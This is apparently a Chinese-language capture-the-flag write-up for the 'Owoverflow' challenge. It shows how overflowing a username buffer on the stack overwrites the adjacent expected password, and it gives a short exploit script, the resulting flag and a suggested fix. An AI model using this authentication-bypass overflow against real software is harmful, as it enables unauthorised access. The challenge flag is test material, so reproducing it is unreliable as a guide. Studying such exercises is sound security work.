# Owoverflow

## 题目简述

登录程序在栈上保存 username 和 expected_password，却用不安全的输入函数读取用户名。username 的前 16 字节必须等于 maple_bacon_user，但后续数据可以越界覆盖 expected_password。随后只要把第二次输入与被覆盖后的密码比较即可登录。

## 解题过程

反编译和调试可见两个数组相邻。保留必须通过的用户名前缀，再填满剩余 username 空间，最后写入自选密码 fakepass：

~~~python
username = b"maple_bacon_user" + b"A" * 16 + b"fakepass"
io.sendlineafter(b"username: ", username)
io.sendlineafter(b"password: ", b"fakepass")
~~~

第一次检查只比较固定用户名区域，仍然成功；第二次 strcmp 读取的 expected_password 已被改成 fakepass，因此也成功，程序输出：

~~~text
maple{n0t1c3s_buff3r_0v3rf10w}
~~~

利用只修改相邻数据，不需要控制返回地址，所以 NX、ROP 和 shellcode 都不是本题重点。

## 方法总结

栈溢出不一定以劫持控制流为目标。修改认证状态、长度、指针或相邻密码常常更简单、更稳定。分析时应先画出局部变量布局和每个检查的顺序，寻找最小数据流篡改；修复则要同时限制输入长度并避免在内存中信任可被相邻缓冲区覆盖的认证值。
